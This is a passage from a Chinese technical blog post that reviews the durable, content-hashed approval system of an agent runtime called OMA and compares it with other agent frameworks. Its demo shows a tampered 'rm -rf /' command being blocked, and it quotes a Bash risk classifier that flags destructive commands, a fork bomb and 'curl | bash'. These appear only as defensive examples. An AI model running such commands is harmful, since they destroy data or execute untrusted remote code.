    ledger_request = ledger.load_request(request_id)
    if ledger_request is None:
        raise ApprovalError("APPROVAL_NOT_FOUND", "主账本里没有这条审批")

    if ledger_request.request_hash != cp_request.request_hash:
        raise ApprovalError("APPROVAL_INTEGRITY_ERROR",
                            "检查点与主账本对同一条审批的哈希不一致 —— fail closed")

    decision = ledger.load_decision(request_id)
    if decision is None:
        raise ApprovalError("APPROVAL_NOT_FOUND", "这条审批还没有决策")

    cp_decision = next((d for d in checkpoint.approval_decisions
                         if d.request_id == request_id), None)
    if cp_decision is None:
        raise ApprovalError("APPROVAL_INTEGRITY_ERROR", "检查点里缺少对应的决策记录")
    if cp_decision.decision != decision.decision:
        raise ApprovalError("APPROVAL_INTEGRITY_ERROR",
                            "检查点与主账本的决策不一致 —— fail closed")

    # 最关键的一步：当前内容必须仍然等于被审阅的内容
    current_hash = hash_approval_request(
        ledger_request.scope, ledger_request.boundary, current_content)
    if current_hash != ledger_request.request_hash:
        raise ApprovalError("APPROVAL_STALE_DECISION",
                            "当前要执行的内容与被审阅的内容不同 —— fail closed")

    return ("execute" if decision.decision == Decision.APPROVED else "deny"), decision
```

**完整代码在文末**，可直接复制运行。实际运行输出：

```
==============================================================================
OMA 持久化审批机制复刻 —— 演示
==============================================================================

[场景 1] Agent 请求执行 rm -rf ./build，触发 tool_call 审批门禁
  requestId    = apr_6ce0366bd0af669e8bc8ca9d30d71106
  requestHash  = 762ad9b374613e27ad155c3e83b8a0df70da902aaf98a657ea8fd85ebaa39dda
  boundary     = t-42:call-7
  同样的内容再次创建 → id 相同? True  hash 相同? True

[场景 2] 运行挂起，检查点写入待批审批
  checkpoint 字节数 = 594

[场景 3] 三个错误决策全部被拒
  ❌ 哈希不符     → APPROVAL_STALE_DECISION
  ❌ 审批人无效   → APPROVAL_VALIDATION_ERROR
  ❌ 决策值非法   → APPROVAL_VALIDATION_ERROR

[场景 4] alice 正常审批通过
  decision   = approved
  reviewer   = alice
  decidedAt  = 2026-11-24T01:00:00.000Z

[场景 5] bob 试图对同一请求再次决策 → 必须失败
  ❌ 重复决策   → APPROVAL_CONFLICT

[场景 6] 新进程恢复：从检查点 + 主账本交叉核对后执行
  ✅ 三道核对通过 → action = execute  (reviewer = alice)

[场景 7] 恢复后内容被篡改（rm -rf ./ → rm -rf /）→ 必须 fail closed
  ✅ 拒绝执行   → APPROVAL_STALE_DECISION: 当前要执行的内容与被审阅的内容不同 —— fail closed

[场景 8] 检查点里的决策被改成 rejected，主账本仍是 approved → fail closed
  ✅ 拒绝执行   → APPROVAL_INTEGRITY_ERROR: 检查点与主账本的决策不一致 —— fail closed

[场景 9] 一个被拒绝的审批 → action = deny
  action = deny

==============================================================================
演示结束：9 个场景全部符合 OMA 的 fail-closed 语义
==============================================================================
```

**场景 7 是整套机制的皇冠**：审批人批的是 `rm -rf ./build`，恢复时要执行的是 `rm -rf /`——系统拒绝执行。**内容寻址把「同意」精确地绑定在了那串字节上，而不是一个可以漂移的 ID 上。**

---

## 四、核心机制二：「可验证运行记录」的真实边界

OMA 的第二句自我描述是 "verifiable run records"。这四个字需要非常小心地读。

### 4.1 它不是什么

我通读了 `packages/core/src/` 全部源码，grep 了 `merkle` / `privateKey` / `publicKey` / `createSign` / `signature`——**没有签名、没有 Merkle 树、没有哈希链、没有 WORM 存储**。整个仓库的 `createHash` 只出现在 4 个文件里：`journal/hash.ts`、`approval/durable.ts`、`observability/file-store.ts`、`eval/file-store.ts`。

OMA 自己的文档说得非常诚实（`docs/run-journal.md`，「Identity and integrity」章节）：

> **No hash chain.** No event carries a digest of its predecessor. Hashes cover one content block each and are recorded on the citing `llm/request`, so rewriting an event in place, or dropping one and renumbering what follows, leaves nothing structurally inconsistent to find; only a raw reorder or a duplicated `seq` trips the sequence check.
>
> **No signature.** Nothing in the journal is signed. The subsystem uses SHA-256 for content identity only and holds no key material.
>
> **No WORM storage.** `JsonlRunJournal` appends to an ordinary file with no lock, which anything with write access can rewrite afterwards.
>
> A writer that can edit the journal can edit an event and recompute the `contentHash` that cites it in the same pass, and `verifyRun()` will return `ok`.

**「能改日志的人可以改一条事件，并在同一趟里重算引用它的 `contentHash`，然后 `verifyRun()` 会返回 `ok`。」**

README 里同样有一行小字免责声明：

> "`verifyRun()` checks the recorded sources and content for consistency offline; **it does not prove the journal was never edited.**"

### 4.2 那它是什么

`verifyRun()` 做的是**内部一致性校验**，三道有序检查：

```mermaid
graph LR
    V1["1️⃣ 序号完整性<br/>SEQ_NOT_MONOTONIC<br/>重复 / 乱序"] --> V2["2️⃣ 引用完整性<br/>BROKEN_LINK<br/>前向引用 / 缺失"]
    V2 --> V3["3️⃣ 逐块可复现<br/>MISSING_CONTEXT_REPLACE<br/>not-reproducible"]
    V3 --> OK["✅ ok = true"]
    V1 --> FAIL["❌ failures"]
    V2 --> FAIL
    V3 --> FAIL
    V3 --> INC["⚠️ inconclusive<br/>窗口外，不算失败"]

    style V1 fill:#C7CEEA,stroke:#9FA8DA,color:#333
    style V2 fill:#E8D5F5,stroke:#CE93D8,color:#333
    style V3 fill:#FFDAB9,stroke:#FFAB76,color:#333
    style OK fill:#B5EAD7,stroke:#80CBC4,color:#333
    style FAIL fill:#FFB3C6,stroke:#F48FB1,color:#333
    style INC fill:#FFF9C4,stroke:#F9A825,color:#333
```

第三道检查是真正的核心。OMA 的模块文档写得很精准：

> "The runner enforces lineage in process, where it can only ever record what it knows: a block either names the event it came from or names nothing. It has no way to record a *wrong* lineage. This module asks the harder question of a journal read back cold — does the event a block names actually reproduce that block, byte for byte?"

实现（`packages/core/src/journal/verify.ts`）：

```typescript
const hashIndex = new Map<RunEvent, ReadonlySet<string>>()
const reproduces = (event: RunEvent): ReadonlySet<string> => {
  const cached = hashIndex.get(event)
  if (cached !== undefined) return cached
  const hashes = new Set<string>()
  if (isMessageEvent(event)) {
    for (const block of event.message.content) hashes.add(canonicalContentHash(block))
  } else if (event.type === 'context/replace') {
    // The derived block is stored verbatim, which is what turns
    // reproducibility into a comparison instead of a re-execution.
    for (const replacement of event.replacements) {
      hashes.add(canonicalContentHash(replacement.block))
    }
  }
  hashIndex.set(event, hashes)
  return hashes
}

for (const event of events) {
  if (event.type !== 'llm/request') continue
  requests += 1
  for (const block of event.blocks) {
    blocksChecked += 1
    // ...
    if (block.sourceEventSeqs === null) {
      failures.push({
        code: 'MISSING_CONTEXT_REPLACE', reason: 'no-lineage', seq: event.seq, ...position,
        detail: `${where} records no lineage, so nothing in the journal explains what the model saw.`,
      })
      continue
    }
    const { resolved, missing, forward } = classify(event.seq, block.sourceEventSeqs)
    if (forward.length > 0) {
      failures.push({
        code: 'BROKEN_LINK', reason: 'forward-reference', seq: event.seq, ...position,
        detail: `${where} names ${list(forward)}, which cannot precede event ${event.seq}.`,
      })
    }
    if (resolved.some((source) => reproduces(source).has(block.contentHash))) continue
    // ...
    failures.push({
      code: 'MISSING_CONTEXT_REPLACE', reason: 'not-reproducible', seq: event.seq, ...position,
      detail: `${where} names ${list(block.sourceEventSeqs)}, and none of those events reproduces its content.`,
    })
  }
}
```

文档解释了为什么这道检查有意义：

> "A rewrite that silently replaces a conversation still *names* prior events, so a predicate that only asked whether lineage was present would accept it. Requiring the named event to reproduce the bytes is what makes an unrecorded rewrite structurally detectable rather than something only a full replay would notice."

**翻译**：如果只检查「有没有写血缘」，一次偷偷替换对话的改写依然能通过（因为它照样写了血缘指向）。**要求被指向的事件能逐字节复现出那个块**，才让「未记录的改写」变成结构性可检测的，而不是只有完整重放才能发现的。

还有一个细节体现了成熟度：区分 **`failures`（矛盾）** 和 **`inconclusive`（窗口外，不构成矛盾）**。如果某事件引用的 seq 落在可读窗口之外，那「不可复现」是**未被证明**而非**已被证明**——把两者混为一谈会制造大量假阳性。

### 4.3 我的判断

**「verifiable run records」这个说法过头了。** 它实际提供的是**内部一致性校验**，不是**防篡改证明**。

但我要给 OMA 记一功：**它在 README 和文档里反复、明确地写出了这个边界**。同时在两个 README 声明旁边都挂了 inline caveat：

- "it does not prove the journal was never edited"
- "A successful run can still leave governance requirements unmet, so applications must check `governanceConclusion` separately."

**一个愿意在自己 README 里主动拆自己台的项目，可信度反而更高。** 这比很多功能名比保证更强的项目强。

**给你的实践建议**：如果你真的需要防篡改，必须把 run journal 放在**能提供该保证的存储上**（WORM、透明度日志、或外部签名的批次），并把 `verifyRun()` 理解为「对 OMA 写了什么的检查」，而不是「对现在磁盘上是什么的检查」。

---

## 五、周边机制：审批不是孤岛

OMA 的审批机制嵌在一整套配套设计里。挑几个关键的看。

### 5.1 后果性工具（Consequential Tools）

审批门禁要拦什么？拦**有真实副作用**的工具。OMA 的做法是：

```typescript
export interface ToolDefinition<TInput = Record<string, unknown>, TData = string> {
  readonly name: string
  readonly description: string
  readonly inputSchema: ZodSchema<TInput>
  /**
   * Marks a tool whose grant permits real side effects. Omitted/false means
   * benign for undeclared-run fallback classification. The runtime never
   * infers this value from prompts, tool arguments, or keywords.
   */
  readonly consequential?: boolean
  // ...
}
```

注意那句注释：**「运行时绝不从 prompt、工具参数或关键词推断这个值」**。

这是很聪明的一刀切。业界常见做法是让 LLM 判断「这个操作危不危险」——那等于让被监督者决定自己要不要被监督。OMA 把它变成**工具注册时的开发者声明**，编译期就定死。

配套的 `withConsequentialConfirmation` 包装器：

```typescript
export function withConsequentialConfirmation(
  config: AgentConfig, state: ConsequentialConfirmationState,
): AgentConfig {
  const existingGate = config.onToolCall
  return {
    ...config,
    onToolCall: async (context): Promise<ToolCallDecision> => {
      if (context.consequential !== true) {
        return existingGate ? existingGate(context) : { action: 'allow' }
      }
      if (existingGate) { /* delegate; record rejection */ }
      if (state.planApproved) return { action: 'allow' }
      state.confirmationRequired = true
      return { action: 'deny', reason: CONFIRMATION_REQUIRED_MESSAGE }
    },
  }
}
```

没有审批路径时，工具**不执行**，结果带上 `confirmationRequired: true` 和运行标记 `consequential-no-independence`。

### 5.2 默认拒绝的工具授权

```typescript
export const TOOL_PRESETS = {
  readonly: ['file_read', 'grep', 'glob'],
  readwrite: ['file_read', 'file_write', 'file_edit', 'grep', 'glob'],
  full: ['file_read', 'file_write', 'file_edit', 'grep', 'glob', 'bash'],
} as const satisfies Record<string, readonly string[]>
```

默认拒绝在 `resolveGrantedToolDefinitions`：

```typescript
const hasPositiveGrant =
  options.toolPreset !== undefined || options.allowedTools !== undefined
if (!hasPositiveGrant) filteredTools = []
```

**没显式授权 = 一个工具都拿不到**。不是白名单匹配失败就放行，而是「没给授权就是空集」。

而且 OMA 做了**双层防护**——模型只被**提供**已授权的工具，但执行时**再独立检查一遍**：

```typescript
// The single source of truth for what this agent may execute. The model is
// only offered `toolDefs`, but a confused model (or prompt injection) can
// still emit a tool_use for an ungranted name; gate execution on this set
// so a registered-but-ungranted tool can never run silently.
const grantedToolNames = new Set(toolDefs.map((t) => t.name))
```

**「模型被提供了什么」和「模型能执行什么」是两件事**。前者是提示，后者是强制。

### 5.3 Bash 风险分级：以及它为什么不是安全边界

OMA 有一个 Bash 风险分类器（`tool/classifiers/bash-risk.ts`），三级 `safe | review | high`：

- **HIGH**：`rm`、`sudo`、`dd`、`mkfs`、`shred`、`chmod 777`、`chown -R`、`eval`、fork bomb、`git push --force`、`npm publish`、重定向进系统路径、`curl | bash`
- **REVIEW**：上下文炸弹类（`ls -R`、`tree`、`find /`、递归 `grep`、`du`、`kill`、`sh -c`）
- 复合命令会**切分**后取**最高**风险；未知命令默认 `review`

但这个模块自己写了一段免责声明（我完整引用，因为这种自曝家门在开源里很少见）：

> **This is a convenience heuristic, NOT a security boundary.** It is a shallow regex/segmentation pass... It can be fooled by obfuscation (variable indirection like `$CMD`, base64-decode-then-exec, unusual quoting, a full nested shell grammar). A `deny` built on it relies on cooperating code — for real isolation use a container / VM / seccomp.

**「这是便利启发式，不是安全边界。」** 这句话值得单独拿出来贴在墙上。

真正做隔离的是别的东西：

**文件系统沙箱**（`tool/built-in/path-safety.ts`）：

```typescript
/**
 * Subdirectory name used as the default sandbox root, relative to
 * `process.cwd()`. Narrower than `process.cwd()` so a freshly configured
 * agent cannot, by default, read or write the user's project source,
 * `.env`, or `.git/` simply because the host happened to launch from the
 * repo root.
 */
export const DEFAULT_WORKSPACE_DIRNAME = '.agent-workspace'
```

默认根目录是 cwd 的**子目录** `.agent-workspace`，刻意比项目根窄。路径检查用 `realpath` 解析根和候选路径，symlink 跳数上限 40，并且**返回 symlink 解析后的路径**：

```typescript
// Return the symlink-resolved path so callers hand a symlink-free path to
// fs APIs. This closes the TOCTOU window where a symlink within the
// candidate could be swapped between this check and the actual fs call.
return { ok: true, path: realCandidate, root: realRoot }
```

**这就是我在 [microsoft/mcp-gateway](https://github.com/xuqi2024/xuqi2024.github.io/2026/07/03/mcp-gateway-harness-mcp-component-session-triplet-binding-anti-attack-practice/) 那篇里讲的「canonicalization 对抗 symlink 逃逸」的同款工程实践**——把「检查」和「使用」之间的 TOCTOU 窗口关上。

### 5.4 治理底线（Governance Floor）

`orchestrator/governance.ts` 的 `evaluateGovernance()` 把声明的 `requiredRoles` / `requiredOrder` 和实际执行记录（跑了哪些角色、执行顺序、依赖边、是否发生独立复核）做比对。

**它故意拿不到 agent 的输出文本**——治理检查的是「谁以什么顺序做了什么」，不是「说了什么」。

结论是三态的：`'satisfied' | 'unsatisfied' | 'not-applicable'`。

README 特别强调：

> "**A successful run can still leave governance requirements unmet**, so applications must check `governanceConclusion` separately."

**运行成功 ≠ 治理达标**。这两个正交的维度，被显式分开暴露给调用方。

### 5.5 租约与围栏令牌

`RunRecord` 里有两个**互相独立**的计数器：

```typescript
export interface RunRecord {
  readonly schema: 1
  readonly runId: string
  /** Optimistic-concurrency version. Starts at 1 and increments on every write. */
  readonly version: number
  readonly status: RunLifecycleStatus
  /** Execution attempt. Increments when a new worker takes an expired run over. */
  readonly attempt: number
  /** Monotonic ownership token. Increments only when the lease changes hands. */
  readonly fencingToken: number
  readonly lease?: RunLease
  // ...
}
```

- `version`：每次写都递增，是 CAS 的令牌
- `fencingToken`：**只在所有权易手时递增**

持有令牌 N 的 worker，在别人拿到 N+1 之后会被拒绝——**即使中间发生了很多次无关的写**。

这两个计数器的分离，对应的是分布式系统里的经典问题：如果只有一个版本号，「无关写导致版本增长」和「所有权变更」就混在一起，无法区分「你的写太老了」和「你已经不是主人了」。**围栏令牌（fencing token）**是标准解法，OMA 直接用了。

状态机也是显式的：

```typescript
const LEGAL_TRANSITIONS: Readonly<Record<RunLifecycleStatus, readonly RunLifecycleStatus[]>> = {
  queued: ['running', 'cancelled', 'failed'],
  running: ['queued', 'suspended', 'completed', 'failed', 'cancelled'],
  suspended: ['queued', 'running', 'cancelled', 'failed'],
  completed: [],
  failed: [],
  cancelled: [],
}
```

终态没有出边——**终态不可离开**，这条不变量从类型层面就钉死了。

### 5.6 六个扩展点

OMA **没有**「middleware」这个统一概念。它的 hook 是散落在 `OrchestratorConfig` / `AgentConfig` / `CoordinatorConfig` / 每次调用 options / `Task` 上的**函数字段**。

从 `docs/hooks-and-callbacks.md` 摘出的关键几个：

| 回调 | 挂载位置 | 抛错时 |
|------|---------|--------|
| `onToolCall` | Agent / Coordinator / Orchestrator | **fail closed**：返回错误 ToolResult |
| `onPlanReady` | Orchestrator | 视为拒绝，运行结束 `success: false` |
| `onTaskDispatch` | Orchestrator | 停止新分发，剩余任务跳过 |
| `onProgress` | Orchestrator | **不隔离**：从调用点向上传播 |
| `onTrace` | Orchestrator | 被吞掉，包括 async rejection |
| `recovery.onTaskOutcome` | Orchestrator | 被吞掉，不打补丁，运行继续 |

**「抛错时的处理方式」被逐条列出来，这本身就是文档质量的红利。** 大多数框架的 hook 文档只说「什么时候触发」，不说「炸了会怎样」——而后者恰恰是集成时最常踩坑的地方。

另外还有**对象生命周期型扩展点**（不是回调，是应用自己掌管生命周期）：`observability.sinks`（`emit`/`forceFlush`/`shutdown`）和 `journal`（`RunJournal` 后端）。

---

## 六、横向对比：三种不同的「人点了同意」

把 OMA 放到生态里对比，才能看清它的取舍。

### 6.1 对比维度

| 维度 | OMA | Tencent LoopForge | LangGraph | microsoft/AGT |
|------|-----|-------------------|------------|--------------|
| 语言 | TypeScript | Go | Python | Python |
| Star | 7,072 | 5,871 | 45,319 | 6,598 |
| License | MIT | NOASSERTION | MIT | MIT |
| 审批模型 | **内容寻址 + CAS 先写者赢** | **工作流节点 + 门禁工具** | **中断 + 检查点** | **策略引擎 + Kill Switch** |
| 审批对象 | 4 种 scope（plan / round / dispatch / tool） | 工作流图上的「人工门禁」节点 | 任意节点中断 | 策略违规处置 |
| 决策载体 | 独立主账本行（`__oma_approval__/*`） | 工作流状态 | Checkpointer | 进程注册表 |
| 谁能批 | 外部进程（应用自建界面） | 有权限的团队成员 | 应用代码 | 策略/回调 |
| 内容变更检测 | ✅ SHA-256 绑定 | ❌ 无 | ⚠️ 依赖检查点版本 | ⚠️ 依赖策略版本 |
| 并发决策 | ✅ CAS 先写者赢 | ⚠️ 单写者 | ⚠️ 依赖后端 | ❌ |
| 跨进程恢复 | ✅ 检查点 + 主账本交叉核对 | ✅ | ✅ | ⚠️ |
| 防篡改 | ❌ 自曝无签名无链 | ❌ | ❌ | ❠️ 审计日志 |

### 6.2 LoopForge：把审批做成工作流图上的一个节点

LoopForge 的思路完全不同。它的做法是**在 DAG 上放一个「人工门禁」节点**。

从 `internal/domain/approval_reason.go`（逐字引用）：

```go
// ApprovalWaitReason explains why an approval (人工门禁) node stops the run:
// the reviewer instructions configured on the node, which finished steps
// are to be checked, what continues after approval and where a rejection
// sends the run back.
func ApprovalWaitReason(run Run, nodeID string) string {
	// ...
	b.WriteString(approvalSOPLabel(wf.Name) + "在这一步设置了人工门禁")
	if len(upstream) > 0 {
		b.WriteString("：" + strings.Join(upstream, "、") + "已完成，需要有权限的成员检查结果后确认")
	} else {
		b.WriteString("，需要有权限的成员确认")
	}
	if len(downstream) > 0 {
		b.WriteString("，确认后继续" + strings.Join(downstream, "、"))
	} else {
		b.WriteString("，确认后运行结束")
	}
	if node.RejectTo != "" {
		b.WriteString("；不通过可打回到" + approvalNodeLabel(wf, node.RejectTo) + "重做")
	}
	// ...
}
```

有意思的是它的**驳回语义**：`RejectTo` 允许把运行打回到指定节点重做。这是「审批不只是放行/拒绝二选一，还能触发重做」——一种更贴近真实流程的语义。

LoopForge 的门禁结果由 Agent 通过一个 **MCP 工具**提交（`internal/gatemcp/server.go`）：

```go
var inputSchema = map[string]any{
	"type":                 "object",
	"additionalProperties": false,
	"required":             []string{"decision", "reason"},
	"properties": map[string]any{
		"decision":       map[string]any{"type": "string", "enum": []string{"pass", "rework", "fail", "human"}},
		"reason":         map[string]any{"type": "string", "minLength": 1, "maxLength": 4000},
		"actionRequired": map[string]any{"type": "string", "maxLength": 4000},
		"summary":        map[string]any{"type": "string", "maxLength": 4000},
		"findings":       map[string]any{"type": "array", "maxItems": 50, /* ... */ },
	},
}
```

**设计差异的本质**：

- **LoopForge 是「内容级门禁」**——门禁关心的是「这一步的产出合不合格」，判定主体是 Agent（配合 `submit_gate_result` 工具），人只是兜底（`decision: "human"`）。
- **OMA 是「动作级门禁」**——门禁关心的是「这个具体调用要不要跑」，判定主体是人，OMA 只提供「让判定可以被持久化和证明」的机制。

这不是谁更好，是**问题不同**。LoopForge 适合「代码交付流水线：AI 改完 → 门禁节点判定 → 人复核 → 打回或放行」。OMA 适合「Agent 要动你的生产环境：每次危险操作都要人点头，且点头这件事必须可审计」。

**但 OMA 有一个 LoopForge 没有的能力**：内容哈希绑定。因为 LoopForge 的门禁结果是**写进工作流状态**的一份 JSON，不是内容寻址的，所以无法回答「人批的那份内容，和后来实际执行的那份，是同一份吗？」

### 6.3 LangGraph：中断检查点

LangGraph 是生态里最成熟的「可中断 Agent 运行时」。它的模型是 `interrupt()` + Checkpointer：

- Agent 跑到某个节点调 `interrupt(payload)`
- 运行时把状态持久化，返回一个带 `__interrupt__` 的结果
- 应用侧拿到 interrupt 后展示给用户，收集答案
- 恢复时用 `Command(resume=value)` 继续

**和 OMA 的差异**：

| | LangGraph | OMA |
|---|---|---|
| 恢复时携带 | 只有 resume 值 | resume 值 + `requestHash` + reviewer 身份 |
| 内容变更检测 | 无内建机制 | SHA-256 绑定 |
| 决策审计 | 无内建 | 独立主账本 |
| 并发决策保护 | 无内建 | CAS 先写者赢 |
| 灵活性 | 极高（任意节点中断） | 固定 4 个门禁面 |

**LangGraph 更灵活，OMA 更严谨。** LangGraph 的模型是「我想在哪儿停就在哪儿停」；OMA 的模型是「我只在四个有明确语义边界的地方停，而且每次停都留下可审计的凭据」。

如果你要做一个任意形状的长流程，LangGraph 更好。如果你需要「每次敏感操作都留痕且可证明」，OMA 的模型更贴。

### 6.4 AGT：策略驱动的处置而非人的批准

microsoft/agent-governance-toolkit（6,598⭐）的路线是**策略引擎 + Kill Switch**。我在 [2026-07-02 那篇 AGT Sub-Agent 失败恢复](https://github.com/xuqi2024/xuqi2024.github.io/2026/07/02/agt-sub-agent-failure-recovery-circuit-breaker-saga-handoff-kill-switch/) 里拆过它的 5 大原语：Cascade Circuit Breaker、Saga Step Handoff、Face/Hands Kernel、Kill Switch、Reversibility。

它的核心是「**怎么处理违规**」，而不是「**人怎么批准**」。Kill Switch 的六类 `KillReason`、Saga 的补偿动作、可逆性四级评估——这些是**运行时自愈**的机制。

**OMA 和 AGT 其实是互补的两层**：

- AGT 层：Agent 自己越界了，怎么按策略处置
- OMA 层：Agent 想做的事本来就该人批，怎么把批准确凿下来

真实的企业系统里这两层都要有。**先有策略层（能不能做），再有审批层（这次要不要做）**——顺序反了会导致大量本可自动拦截的操作都变成人工负担。

---

## 七、优缺点：用工程语言讲

### 7.1 左侧：架构简洁性 / 扩展性 / 易用性

| 维度 | 评价 | 具体依据 |
|------|------|---------|
| **架构简洁性** | ✅ 优秀 | 三平面分离在模块依赖图层面强制；审批只有 1 个文件（18.8KB）；存储契约只有 `MemoryStore` 接口（含 `compareAndSet`）；无 SQL schema；运行时直接依赖只有 2 个 |
| **扩展性** | ✅ 优秀 | 20+ provider adapter 统一契约；MCP / ACP / AWS / Google GenAI / AI SDK 全部懒加载 peer；`defineTool()` 是干净的插件面；hook 是函数字段散落在 5 个配置对象上（不统一但灵活）；`observability.sinks` 生命周期由应用掌管 |
| **易用性** | ⚠️ 中等 | 库形态（无托管服务、无账号、无遥测）上手门槛低；但 `suspend` / `restore` / 双账本 / 五代检查点 schema 概念负担不轻；`oma verify-run` 命令**官方标注为"planned and deliberately not built yet"** |

### 7.2 右侧：性能 / 复杂度 / 维护性

| 维度 | 评价 | 具体依据 |
|------|------|---------|
| **性能** | ⚠️ 有代价 | Journal 每次追加是 O(1) 追加写（**故意不放在 MemoryStore 上**，因为「FileStore 每次写重写整个文件，走它会让每个模型调用追加一条事件的代价变成 O(store 大小)」）；JSONL 批量写有 50ms 固定窗口（首个事件开窗，后续事件不重置）；但审批路径每次要做 canonical JSON + SHA-256，对**大内容**（比如超长 plan）会有可观开销 |
| **复杂度** | ⚠️ 偏高 | 五代检查点 schema（v1→v5）；`onApproval`（旧版轮次屏障）与 `onTaskDispatch`（原生管线门禁）**互斥**，同时设置构造函数直接抛错；journal 尾部重放是全有或全无（任何不一致就丢弃整条尾巴）；双账本交叉核对；6 个错误码 |
| **维护性** | ✅ 良好 | 177 个测试文件 / 2.05MB（比源码还大）；文档主动写清每个 hook 抛错后的行为；README 主动声明边界；中文 README 同步维护；MIT + 8 个月持续提交 |

### 7.3 三个必须知道的局限

**局限一：「verifiable」不等于防篡改。**

已在第四节详述。**这是最重要的一条**，也是我在选项目时反复确认的——一个把「内部一致性」包装成「可验证」的项目，如果没有主动声明边界，是要扣分的。OMA 主动声明了，所以扣分不多。

**局限二：单写者限制。**

`FileStore` 和 `JsonlRunJournal` 都是单写者。官方文档明确：跨进程恢复不在其能力范围内，**多 worker 审批决策需要数据库支撑的 `MemoryStore` 且必须支持原子 CAS**。

也就是说，OMA 的内置存储只够「单进程 + 人工审批 + 跨进程恢复」这个场景。**要跑多 worker 集群，你得自己接一个带 CAS 的后端。**

**局限三：审批人身份不被认证。**

journal 事件里**没有任何 operator / user / principal 字段**——它只识别 agent，不识别人。人的身份只从 `approval/decision` 事件的 `reviewer.id` 进来，而 OMA 只校验它是非空字符串，**不认证它**。

**「alice 批的」和「攻击者填了个 alice」在 OMA 眼里没有区别。** 身份认证是应用层的事。这在文档里是明确的，但值得单独拎出来说——因为「谁批准的」是审计的核心。

**另外还有一条 tension 值得知道**：`contentHash` 是**进程内**算的，而 `JsonlRunJournal` 是**写入时**做脱敏的。所以「一个被脱敏过的 journal 最多只能部分通过校验」——官方文档自己承认这一点。

---

## 八、从零搭建启示：我会怎么复刻

如果我要给自己搭一个「带持久化审批的 Agent 运行时」，按什么顺序做？

### 8.1 MVP：最小可行实现（必须 vs 可省）

**必须做的（缺一不可）：**

| # | 组件 | 为什么必须 |
|---|------|-----------|
| 1 | **内容寻址的审批请求**（canonical JSON + SHA-256 + 确定性 ID） | 没有它就无法回答「人批的是哪份内容」 |
| 2 | **CAS 存储契约**（`compareAndSet`） | 没有它就无法保证「先写者赢」 |
| 3 | **strict / best-effort 双模持久化** | 没有它就会出现「对外说挂起了但状态没存」 |
| 4 | **恢复时的哈希重验** | 没有它就可能出现「批的是 A、执行的是 B」 |
| 5 | **失败即关闭**（校验失败返回错误结果，不抛异常） | 抛异常会把安全策略变成可用性事故 |

**可以先省的：**

- ❌ **journal / 审计日志**——等审批跑通了再加。日志是「事后查」，审批是「当场拦」，优先级完全不同。
- ❌ **租约 / 围栏令牌**——单进程时完全不需要。
- ❌ **MCP / ACP 后端**——先用内置工具（bash / file_read / file_write / grep / glob）。
- ❌ **20+ provider adapter**——先接一个。
- ❌ **离线 Run Viewer**——纯锦上添花。
- ❌ **五级检查点 schema**——**一开始就定好版本字段**，但只实现 v1。

### 8.2 踩坑预警

**坑 1：把「审批」实现成回调里 return false。**

这是 90% 的框架的做法。它的问题不是「不够安全」，而是**「不可持久化」**——进程一挂，这次决策就没了。OMA 的整篇文章都在证明：**审批是一个需要被存储的事实，不是一个控制流分支。**

**坑 2：只绑 ID，不绑内容。**

`approve(taskId=42)` 这种设计有个致命漏洞：任务 42 的内容在这 3 分钟里被改了。**必须绑哈希。**

**坑 3：先承诺后持久化。**

顺序必须是：**写状态 → 写账本 → 然后才对外说「我挂起了」**。OMA 的 `persistCheckpoint(true)` 就是这个 strict 模式。反过来做，你会得到一个「报告说挂起、实际没存」的幽灵状态。

**坑 4：用 `JSON.stringify` 直接算哈希。**

JS 键序是插入序。同一份内容从不同路径构造出来哈希会不同。**必须递归排序键**。同理，Python 的 `json.dumps` 默认 `sort_keys=False`，我那个复刻里就踩了这个坑——`stable_json` 显式 `sorted(value.keys())`。

**坑 5：把失败处理写成抛异常。**

审批校验失败应该**返回 deny 结果**，让 Agent 知道「这个操作被拒了」，而不是让整个运行时崩掉。前者是安全策略，后者是可用性事故。

**坑 6：把 `reason` 算进哈希。**

它会导致同一个审批在不同时刻产生不同哈希，跨进程 ID 对不上。**哈希只覆盖「被审阅的内容」**（scope + boundary + content），元数据一律排除。

**坑 7：忘了检查点 schema 版本。**

OMA 从 v1 一路升到 v5，每一版加一个能力（runId → identity → in-flight → 审批续跑 → journal 水位）。**一开始就把 `version` 字段加上**，成本是 0；后补是 breaking change。

**坑 8：以为审批 = 授权。**

OMA 的三层是不同的东西：**授权**（这个 agent 能做什么工具）→ **策略**（这个操作允不允许）→ **审批**（这次具体操作要不要人点头）。只有第三层是人参与。把它们混成一层，就会出现「审批通过了就等于永久授权」这类漏洞。

### 8.3 一条实施顺序建议

```mermaid
graph LR
    S1["🔐 工具授权<br/>默认拒绝<br/>grantedToolNames 二次校验"] --> S2["⚠️ 后果性声明<br/>consequential 标记<br/>不从 prompt 推断"]
    S2 --> S3["🚧 门禁回调<br/>allow / deny / suspend"]
    S3 --> S4["🔢 内容寻址<br/>canonical JSON + SHA-256"]
    S4 --> S5["🔒 CAS 存储<br/>先写者赢"]
    S5 --> S6["📚 双账本<br/>检查点 + 主账本<br/>恢复时交叉核对"]

    style S1 fill:#C7CEEA,stroke:#9FA8DA,color:#333
    style S2 fill:#C7CEEA,stroke:#9FA8DA,color:#333
    style S3 fill:#E8D5F5,stroke:#CE93D8,color:#333
    style S4 fill:#FFDAB9,stroke:#FFAB76,color:#333
    style S5 fill:#FFB3C6,stroke:#F48FB1,color:#333
    style S6 fill:#B5EAD7,stroke:#80CBC4,color:#333
```

**先做 1、2（纯代码，零架构成本），再做 3（引入挂起语义），最后才做 4、5、6（引入持久化与一致性）。**

这个顺序的好处是：前三步做完你已经有「可用的审批门禁」，哪怕它还不可持久化；后三步是把它升级成「可审计的审批」。**不要一上来就设计分布式一致性协议**——那会让你在还没有基本需求的时候就开始处理最难的部分。

---

## 九、趋势判断与行动建议

### 9.1 OMA 代表的方向

我觉得 OMA 指向的是 Agent 生态里一条**尚未被充分定价的路线**：

> **Agent 运行时的价值，正从「能干什么」转向「能证明自己干了什么、以及得到过谁的许可」。**

具体信号有三个：

**信号一：库形态回归。** OMA 明确说「A library with no OMA backend or account, and none planned. It makes no analytics, license, update, or phone-home request.」在大量 Agent 框架走向托管 SaaS 的同时，它选择做一个纯库 + 自托管。

**信号二：存储接口而非数据库 schema。** 没有 DDL，只有 `MemoryStore` 契约。这意味着「你已经有 Postgres / Redis / DynamoDB，套个适配器就能用」。

**信号三：诚实的边界声明。** 两处 inline caveat + 主动写「This is a convenience heuristic, NOT a security boundary」。**这在一个普遍过度承诺的赛道里，是稀缺品。**

### 9.2 给三类读者的具体建议

**如果你在做企业级 Agent 落地：**

